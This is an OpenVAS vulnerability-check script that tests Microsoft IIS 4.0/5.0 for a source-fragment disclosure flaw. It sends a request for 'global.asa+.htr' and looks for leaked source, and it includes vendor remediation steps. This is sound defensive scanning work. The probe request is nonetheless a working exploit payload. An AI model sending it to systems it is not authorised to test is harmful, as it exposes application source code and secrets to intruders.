###############################################################################
# OpenVAS Vulnerability Test
# $Id: iis_frag_disclosure.nasl 13975 2019-03-04 09:32:08Z cfischer $
#
# Test Microsoft IIS Source Fragment Disclosure
#
# Authors:
# Pedro Antonio Nieto Feijoo <pedron@cimex.com.cu>
#
# Copyright:
# Copyright (C) 2001 Pedro Antonio Nieto Feijoo
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

# Test Microsoft IIS 4.0/5.0 Source Fragment Disclosure Vulnerability

CPE = "cpe:/a:microsoft:iis";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10680");
  script_version("$Revision: 13975 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-04 10:32:08 +0100 (Mon, 04 Mar 2019) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_bugtraq_id(1193, 1488);
  script_cve_id("CVE-2000-0457", "CVE-2000-0630");
  script_name("Test Microsoft IIS Source Fragment Disclosure");
  script_category(ACT_GATHER_INFO);
  script_copyright("This script is Copyright (C) 2001 Pedro Antonio Nieto Feijoo");
  script_family("Remote file access");
  script_dependencies("secpod_ms_iis_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("IIS/installed");

  script_xref(name:"URL", value:"http://www.microsoft.com/technet/security/bulletin/MS01-004.mspx");

  script_tag(name:"solution", value:".htr script mappings should be removed if not required.

  - open Internet Services Manager

  - right click on the web server and select properties

  - select WWW service > Edit > Home Directory > Configuration

  - remove the application mappings reference to .htr

  If .htr functionality is required, install the relevant patches
  from Microsoft (MS01-004)");
  script_tag(name:"summary", value:"Microsoft IIS 4.0 and 5.0 can be made to disclose
  fragments of source code which should otherwise be
  inaccessible. This is done by appending +.htr to a
  request for a known .asp (or .asa, .ini, etc) file.");

  script_tag(name:"qod_type", value:"remote_banner");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 ); # To have a reference to the detection NVT

BaseURL = ""; # root of the default app

banner = get_http_banner( port:port );
if( ! banner ) exit( 0 );
if( banner !~ "Microsoft-IIS/[45]\." ) exit( 0 );

req = http_get( item:"/", port:port );
data = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( ! data ) exit( 0 );

if( egrep( pattern:"^HTTP.* 40[123] .*", string:data ) )exit( 0 ); # if default response is Access Forbidden, a false positive will result
if( "WWW-Authenticate" >< data ) exit( 0 );

# Looking for the 302 Object Moved ...
if( data ) {
  if( "301" >< data || "302" >< data || "303" >< data ) {

    # Looking for Location of the default webapp
    tmpBaseURL = egrep( pattern:"Location:*", string:data );

    # Parsing Path
    if( tmpBaseURL ) {
      tmpBaseURL = tmpBaseURL - "Location: ";
      len = strlen( tmpBaseURL );
      strURL = "";

      for( j = 0; j < len; j++ ) {
        strURL = string( strURL, tmpBaseURL[j] );
        if( tmpBaseURL[j] == "/" ) {
          BaseURL = string( BaseURL, strURL );
          strURL = "";
        }
      }
    }
  }
}

if( BaseURL == "" ) BaseURL = "/";

# We're going to attack!
req = http_get( item:BaseURL, port:port );
data = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
if( ! data ) exit( 0 );

if( ereg( pattern:"^HTTP/[0-9]\.[0-9] 40[13] .*", string:data ) ) exit( 0 );
if( "WWW-Authenticate:" >< data ) exit( 0 );

req = http_get( item:string( BaseURL, "global.asa+.htr" ), port:port );
data = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

# HTTP/1.x 200 - Command was executed
if( data =~ "HTTP/1.. 200" ) {
  if( "RUNAT" >< data ) {
    report = 'We could disclosure the source code of the "' + BaseURL + 'global.asa" on the remote web server.\n';
    report += 'This allows an attacker to gain access to fragments of source code of the remote applications.';
    security_message( port:port, data:report );
    exit( 0 );
  }
} else {
  # HTTP/1.x 401 - Access denied
  # HTTP/1.x 403 - Access forbidden
  if( data =~ "HTTP/1.. 401" ) {
    report = "It seems that it's possible to disclose fragments of source code of your web applications which ";
    report += "should otherwise be inaccessible. This is done by appending +.htr to a request for a known .asp (or .asa, .ini, etc) file.";
    security_message( port:port, data:report );
    exit( 0 );
  } else {
    if( data =~ "HTTP/1.. 403" ) {
      report = "It seems that it's possible to disclose fragments of source code of your web applications which ";
      report += "should otherwise be inaccessible. This is done by appending +.htr to a request for a known .asp (or .asa, .ini, etc) file.";
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
